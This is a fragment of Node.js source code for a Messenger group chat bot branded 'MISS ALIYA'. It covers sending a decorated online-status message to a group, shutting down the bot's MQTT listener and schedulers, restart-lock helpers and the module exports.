            else logs.success('ALIYA_CONN', 'MISS ALIYA promoted to admin 👑');
          });
        } catch (e) { }

      } catch (finalErr) {
        logs.error('ALIYA_CONN', `Group creation failed: ${finalErr.message}`);
      }
    } else if (botSetup.groupThreadID) {
      // ============= ONLINE MESSAGE BHI AMAZING BANAYA =============
      const onlineMsg = `╔══════════════════════════╗
     🔥 𝐁𝐎𝐓 𝐈𝐒 𝐁𝐀𝐂𝐊 𝐎𝐍𝐋𝐈𝐍𝐄 🔥
╚══════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━
👑 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀'𝐒 𝐁𝐎𝐓
━━━━━━━━━━━━━━━━━━━━━━

⚡ 𝐁𝐨𝐭: ${global.config.BOTNAME}
💫 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞-𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝
🚀 𝐏𝐨𝐰𝐞𝐫: 𝐅𝐮𝐥𝐥 𝐀𝐜𝐭𝐢𝐯𝐞

━━━━━━━━━━━━━━━━━━━━━━
🔥 𝐀𝐛 𝐊𝐡𝐞𝐥 𝐒𝐡𝐮𝐫𝐮 𝐇𝐨𝐭𝐚 𝐇𝐚𝐢! 🔥
━━━━━━━━━━━━━━━━━━━━━━`;
      
      try {
        await api.sendMessage(onlineMsg, botSetup.groupThreadID);
        logs.success('ALIYA_CONN', 'Online status sent');
      } catch (e) {
        logs.warn('ALIYA_CONN', 'Could not send online notification');
      }
    }

  } catch (error) {
    logs.error('ALIYA_CONN', error.message);
  }
}

function stopBot() {
  // Stop all schedulers first
  stopSchedulers();

  // Clear cooldowns and replies to prevent stale data
  if (client) {
    client.cooldowns.clear();
    client.replies.clear();
  }

  // Mark listener as inactive to ignore incoming events
  if (listenerCallback) {
    listenerCallback.active = false;
    listenerCallback = null;
  }

  if (api) {
    logs.info('BOT', 'Stopping MQTT listener...');
    try {
      api.stopListenMqtt();
    } catch (e) {
      logs.warn('BOT', 'Error stopping listener:', e.message);
    }
    api = null;
    global.api = null;
    logs.success('BOT', 'Bot instance stopped successfully.');
  }

  isStarting = false;
}

// Global restart lock functions - used by restart command
function setRestarting(value) {
  isRestarting = value;
}

function isRestartingNow() {
  return isRestarting;
}

module.exports = {
  startBot,
  stopBot,
  getApi: () => api,
  getClient: () => client,
  getConfig: () => config,
  saveConfig,
  loadConfig,
  reloadCommands: () => loadCommands(client, commandsPath),
  reloadEvents: () => loadEvents(client, eventsPath),
  setRestarting,
  isRestartingNow
};

if (require.main === module) {
  startBot();
}
